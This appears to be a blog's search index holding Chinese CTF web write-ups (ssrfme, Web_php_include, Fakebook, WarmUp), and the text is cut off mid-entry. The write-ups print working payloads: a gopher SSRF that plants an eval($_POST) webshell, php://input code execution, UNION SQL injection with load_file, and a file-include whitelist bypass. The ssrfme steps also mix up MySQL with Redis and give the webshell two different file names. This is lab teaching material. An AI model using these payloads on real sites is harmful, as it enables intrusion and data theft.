<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ssrfme</title>
      <link href="/2021/12/11/ssrfme/"/>
      <url>/2021/12/11/ssrfme/</url>
      
        <content type="html"><![CDATA[<p>###题目</p><p>一段php代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init(); <span class="comment">// 创建一个cURL资源</span></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>); <span class="comment">// 设置URL和相应的选项</span></span><br><span class="line">        curl_exec(<span class="variable">$ch</span>);<span class="comment">// 抓取URL并把它传递给浏览器</span></span><br><span class="line">        curl_close(<span class="variable">$ch</span>); <span class="comment">// 关闭cURL资源，并且释放系统资源</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">curl(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>###步骤</p><p><strong>利用gopher协议无密码注入mysql</strong></p><p>使用<a href="https://github.com/tarunkant/Gopherus">Gopherus工具</a>构造payload，本质是SSRF+RCE</p><p>此工具需要安装两个包，并且用python2，Windows和Linux均可</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20211211211331933.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\lenovo\Desktop\Gopherus-master&gt; python2 gopherus.py --exploit redis</span><br><span class="line">What do you want?? (ReverseShell/PHPShell): PHPShell</span><br><span class="line">Give web root location of server (default is /var/www/html):// 默认地址，直接回车</span><br><span class="line">Give PHP Payload (We have default PHP Shell): select &quot;&lt;?php eval($_POST[cmd]); ?&gt;&quot; into outfile &quot;/var/www/html/cmd.php&quot;; // 写入一句话木马</span><br><span class="line">Your gopher link is Ready to get PHP Shell:xxxxxxxxxx // 生成payload</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.1.5.252:28102/?url=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2478%0D%0A%0A%0A</span><br></pre></td></tr></table></figure><p>shell.php成功写入，用蚁剑连接</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20211211212148187.png"></p><p>在根目录下的qaq里找到flag</p><p>###知识点(gopher协议)</p><p>在ssrf时常常会用到gopher协议构造post包来攻击内网应用。其实构造方法与http协议类似。<br>不同的点在于gopher协议没有默认端口，所以需要指定web端口，而且需要指定post方法。回车换行使用%0d%0a。注意post参数之间的&amp;分隔符也要进行url编码<br>基本协议格式：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web_php_include(攻防世界)</title>
      <link href="/2021/11/11/Web_php_include(%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C)/"/>
      <url>/2021/11/11/Web_php_include(%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C)/</url>
      
        <content type="html"><![CDATA[<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>打开链接是一串php代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);  <span class="comment">//语法高亮，基本没利用点</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];    <span class="comment">//输出传参hello，因该是给我们用来判定是否传入数据成功</span></span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];   <span class="comment">//将get到的page值赋给$page</span></span><br><span class="line"><span class="keyword">while</span> (strstr(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123; <span class="comment">//当我传入PHp://时函数是没有检测到，返回false那么循环语句里面的都不执行。</span></span><br><span class="line">    <span class="variable">$page</span>=str_replace(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>); <span class="comment">//执行包含$page文件，而page的内容我们可以通过post方式传入。</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>对上面的代码进行分析+看别的题解大概知道就是我们先get传入</p><blockquote><p>?page=php://input（利用php伪协议大小写绕过改成?page=PHP://input）</p></blockquote><p>然后就能以post方式传入我们想要执行的命令<br>传入post值：</p><blockquote><?php system("ls");?><p>得到<br><img src="https://img-blog.csdnimg.cn/a1b701842cb34edda756363651c7d132.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6LW25LiN5LiK5pep6aWt,size_16,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>flag应该就在fl4gisisish3r3.php里面<br>接着我们将post值改成<br><?php system("cat fl4gisisish3r3.php");?><br>在源代码中可以找到flag<br><img src="https://img-blog.csdnimg.cn/25175a0d7a2c44d1b9d7d1a03c4d4349.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6LW25LiN5LiK5pep6aWt,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p></blockquote><h2 id="知识总结"><a href="#知识总结" class="headerlink" title="知识总结"></a>知识总结</h2><p><strong>文件包含漏洞</strong><br>文件包含漏洞，就是说你使用文件包含函数后，会把你包含的文件也进行一遍编译或者叫做执行。    PHP中文件包含函数有以下四种：</p><blockquote><p>require()、require_once()、include()、include_once()</p></blockquote><p>其中include和require区别主要是，include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；<br>require函数出现错误的时候，会直接报错并退出程序的执行。<br>include_once()，require_once()这两个函数，与前两个的不同之处在于这两个函数只包含一次.<br><strong>php伪协议中的php://input</strong><br>一般的利用形式为file=php://input。php://input    可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行且php://input 也可以用来生成一句话木马。<br><strong>strstr函数的理解</strong><br>strstr(被搜索的字符串，搜索的字符串)  函数搜索字符串在另一字符串中是否存在，如果是返回该字符串及剩余部分，否则返回    FALSE。但是需要注意它是严格区分大小写的，也就是说可以利用PHp://input。 str_replace函数的理解      str_replace(str1,str2,str),将str字符串中的str1替换成str2注意：他是区分大小写的。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[网鼎杯 2018]Fakebook</title>
      <link href="/2021/11/11/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%5DFakebook%EF%BC%88%E6%B3%A8%E5%85%A5%EF%BC%89/"/>
      <url>/2021/11/11/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%5DFakebook%EF%BC%88%E6%B3%A8%E5%85%A5%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>人除我佬。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>进入网站，界面如下<br><img src="https://img-blog.csdnimg.cn/2021051720552260.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUyNzEwOTQ3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>先打开<strong>join</strong>看一下，注册页面，随便注册一下<br>注册成功后直接登录<br><img src="https://img-blog.csdnimg.cn/20210517205837581.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUyNzEwOTQ3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>username</strong>下面可以点击进入<br><img src="https://img-blog.csdnimg.cn/20210517205934984.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUyNzEwOTQ3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接下来就不会写了，按惯例看大佬的题解：<br>通过dirsearch爆破出网站存在一个**/flag.php**网页，但是无法正常读取。<br>访问robots协议，发现有源码备份文件。<br><img src="https://img-blog.csdnimg.cn/2021051721145011.png" alt="在这里插入图片描述"><br>访问，下载，得到源码</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> function __construct($name, $age, $blog)</span><br><span class="line">    &#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;name = $name;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;age = (<span class="keyword">int</span>)$age;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">get</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = <span class="built_in">curl_init</span>();</span><br><span class="line"></span><br><span class="line">        <span class="built_in">curl_setopt</span>($ch, CURLOPT_URL, $url);</span><br><span class="line">        <span class="built_in">curl_setopt</span>($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = <span class="built_in">curl_exec</span>($ch);</span><br><span class="line">        $httpCode = <span class="built_in">curl_getinfo</span>($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">curl_close</span>($ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> function <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;<span class="built_in">get</span>($<span class="keyword">this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> function <span class="title">isValidBlog</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = $<span class="keyword">this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">preg_match</span>(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先进行页面功能分析。<br>常规注册并登录，发现登录后url存在注入点。</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">view.php?no=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span></span><br><span class="line">#成功运行</span><br><span class="line">view.php?no=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span></span><br><span class="line">#成功运行，说明此处存在sql注入点。</span><br><span class="line">view.php?no=<span class="number">1</span> order by <span class="number">5</span></span><br><span class="line">#<span class="number">4</span>的时候不报错，<span class="number">5</span>的时候报错，证明有<span class="number">4</span>个字段</span><br><span class="line">view.php?no=<span class="number">-1</span> <span class="keyword">union</span> select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span></span><br><span class="line"><span class="meta">#no hack~应该是union被过滤了</span></span><br><span class="line">view.php?no=<span class="number">-1</span> <span class="keyword">union</span><span class="comment">/**/</span>select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span></span><br><span class="line">#成功有回显</span><br><span class="line">view.php?no=<span class="number">-1</span> <span class="keyword">union</span><span class="comment">/**/</span>select <span class="number">1</span>,<span class="built_in">database</span>(),<span class="number">3</span>,<span class="number">4</span> </span><br><span class="line">#成功爆出数据库的名称fakebook</span><br><span class="line">view.php?no=<span class="number">-1</span> <span class="keyword">union</span><span class="comment">/**/</span>select <span class="number">1</span>,<span class="built_in">group_concat</span>(table_name),<span class="number">3</span>,<span class="number">4</span> from information_schema.tables.where table_schema=<span class="built_in">database</span>()</span><br><span class="line">#成功爆出表名为users</span><br><span class="line">view.php?no=<span class="number">-1</span> <span class="keyword">union</span><span class="comment">/**/</span>select <span class="number">1</span>,<span class="built_in">group_concat</span>(column_name),<span class="number">3</span>,<span class="number">4</span> from information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span></span><br><span class="line">#成功爆出字段名：no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</span><br><span class="line">view.php?no=<span class="number">-1</span> <span class="keyword">union</span><span class="comment">/**/</span>select <span class="number">1</span>,<span class="built_in">group_concat</span>(data),<span class="number">3</span>,<span class="number">4</span> from users</span><br><span class="line">#成功爆出注册时的序列化账户</span><br><span class="line">#O:<span class="number">8</span>:<span class="string">&quot;UserInfo&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;tzzzez&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;i:<span class="number">20</span>;s:<span class="number">4</span>:<span class="string">&quot;blog&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;tzzzez.blog&quot;</span>;&#125;</span><br><span class="line">view.php?no=<span class="number">-1</span> <span class="keyword">union</span><span class="comment">/**/</span>select <span class="number">1</span>,<span class="built_in">load_file</span>(<span class="string">&#x27;/var/www/html/flag.php&#x27;</span>),<span class="number">3</span>,<span class="number">4</span></span><br><span class="line">#借助load_file函数读取flag.php网页内容</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="方法1："><a href="#方法1：" class="headerlink" title="方法1："></a>方法1：</h3><p>借助load_file函数读取结果</p><blockquote><p>view.php?no=-1 union/**/select 1,load_file(‘/var/www/html/flag.php’),3,4</p></blockquote><p>f12查看源码可以找到flag<br><img src="https://img-blog.csdnimg.cn/20210517212403125.png" alt="在这里插入图片描述"></p><h3 id="方法2："><a href="#方法2：" class="headerlink" title="方法2："></a>方法2：</h3><p>借助ssrf，通过get函数读取/flag.php内容，由于被过滤，所以无法直接读取。因此借助file协议读取网页内容。读取的payload为：</p><blockquote><p>file:///var/www/html/flag.php</p></blockquote><p>函数中的user还有一层序列化，此时可以通过sql爆破出的user的序列化进行构建，也可以通过源码进行构造。（混子表示完全看不懂…）</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> <span class="built_in">UserInfo</span>();</span><br><span class="line">$a-&gt;name = <span class="string">&#x27;tzzzez&#x27;</span>;</span><br><span class="line">$a-&gt;age=<span class="number">20</span>;</span><br><span class="line">$a-&gt;blog=<span class="string">&#x27;file:///var/www/html/flag.php&#x27;</span>;</span><br><span class="line"><span class="function">echo <span class="title">serialize</span><span class="params">($a)</span></span>;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210517212654796.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUyNzEwOTQ3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>最后通过sql注入，返回file读取的内容</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">view.php?no=<span class="number">-1</span>%<span class="number">20u</span>nion<span class="comment">/**/</span>select%<span class="number">201</span>,<span class="number">2</span>,<span class="number">3</span>,%<span class="number">27</span>O:<span class="number">8</span>:<span class="string">&quot;UserInfo&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;tzzzez&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;i:<span class="number">20</span>;s:<span class="number">4</span>:<span class="string">&quot;blog&quot;</span>;s:<span class="number">29</span>:<span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;%<span class="number">27</span></span><br></pre></td></tr></table></figure><p>f12查看源码里找到flag<br><img src="https://img-blog.csdnimg.cn/202105172135475.png" alt="在这里插入图片描述"></p><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>混子不配得到flag…</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[HCTF 2018]WarmUp(PHP 代码审计)</title>
      <link href="/2021/11/11/%5BHCTF%202018%5DWarmUp(PHP%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)/"/>
      <url>/2021/11/11/%5BHCTF%202018%5DWarmUp(PHP%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>buuctf里web的第一道题，比较怀念，依然不会写。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>打开题目，是一个滑稽图<br><img src="https://img-blog.csdnimg.cn/20210516210712121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUyNzEwOTQ3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看不出什么，查看网页源代码，发现了source.php<br><img src="https://img-blog.csdnimg.cn/20210516210901476.png" alt="在这里插入图片描述"><br>访问source.php，发现以下source.php中的代码，<br>有一说一，我也看不懂是什么意思，看别人的题解知道，这是index.php的源代码</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static <span class="keyword">function</span> checkFile(&amp;<span class="variable">$page</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! isset(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! empty(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="built_in">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>发现hint.php，看一下，提示flag在/ffffllllaaaagggg里面，咱也不知道怎么访问，就跑去看看大佬的题解<br><img src="https://img-blog.csdnimg.cn/20210516211728347.png" alt="在这里插入图片描述"><br>看大佬题解知道接下来要分析代码，咱也不会，就看看大佬的分析过程</p><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="built_in">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">       &amp;&amp; <span class="built_in">is_string</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">       &amp;&amp; emmm::<span class="built_in">checkFile</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">   ) &#123;</span><br><span class="line">       include $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">       exit;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       echo <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">   &#125;  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>整体利用的漏洞就是代码最后的include函数，利用文件包含漏洞<br>因此，最后的if条件语句是关键，即需要满足 <em><strong>if(true &amp;&amp; true &amp;&amp; true)</strong></em> ，才会执行include函数，否则输出滑稽图。<br>! empty($_REQUEST[‘file’]满足true简单<br>is_string($_REQUEST[‘file’]满足true简单<br>emmm::checkFile($_REQUEST[‘file’]满足true，需要执行emmm类中的checkFile函数，使得该函数最终返回true才可以</p><p>整体细节详解（checkFile函数的目标就是返回true）：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">   &#123;</span></span><br><span class="line">       <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> function <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">       </span>&#123;</span><br><span class="line">           $whitelist = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">           <span class="keyword">if</span> (! <span class="built_in">isset</span>($page) || !<span class="built_in">is_string</span>($page)) &#123;</span><br><span class="line">               echo <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">               <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (<span class="built_in">in_array</span>($page, $whitelist)) &#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           $_page = <span class="built_in">mb_substr</span>(</span><br><span class="line">               $page,</span><br><span class="line">               <span class="number">0</span>,</span><br><span class="line">               <span class="built_in">mb_strpos</span>($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">           );</span><br><span class="line">           <span class="keyword">if</span> (<span class="built_in">in_array</span>($_page, $whitelist)) &#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           $_page = <span class="built_in">urldecode</span>($page);</span><br><span class="line">           $_page = <span class="built_in">mb_substr</span>(</span><br><span class="line">               $_page,</span><br><span class="line">               <span class="number">0</span>,</span><br><span class="line">               <span class="built_in">mb_strpos</span>($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">           );</span><br><span class="line">           <span class="keyword">if</span> (<span class="built_in">in_array</span>($_page, $whitelist)) &#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           echo <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (! <span class="built_in">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">       &amp;&amp; <span class="built_in">is_string</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">       &amp;&amp; emmm::<span class="built_in">checkFile</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">   ) &#123;</span><br><span class="line">       include $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">       exit;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       echo <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">   &#125;  </span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、定义了一个类emm</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、在类emm中定义了一个<span class="built_in">checkFile</span>()函数</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、不执行函数，先判断下面的<span class="keyword">if</span>语句：<span class="keyword">if</span> (<span class="literal">true</span> &amp;&amp; <span class="literal">true</span> &amp;&amp; <span class="literal">true</span>)才能执行include函数，所</span><br><span class="line">以需要满足如下要求：</span><br><span class="line">(<span class="number">1</span>)$_REQUEST[<span class="string">&#x27;file&#x27;</span>]不为空，!<span class="built_in">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>]才会返回<span class="literal">true</span>；</span><br><span class="line">(<span class="number">2</span>)$_REQUEST[<span class="string">&#x27;file&#x27;</span>]是字符串，<span class="built_in">is_string</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>]才会返回<span class="literal">true</span>;</span><br><span class="line">(<span class="number">3</span>)<span class="built_in">checkFile</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>]返回<span class="literal">true</span>，emmm::<span class="built_in">checkFile</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>]才</span><br><span class="line">会返回<span class="literal">true</span>；</span><br><span 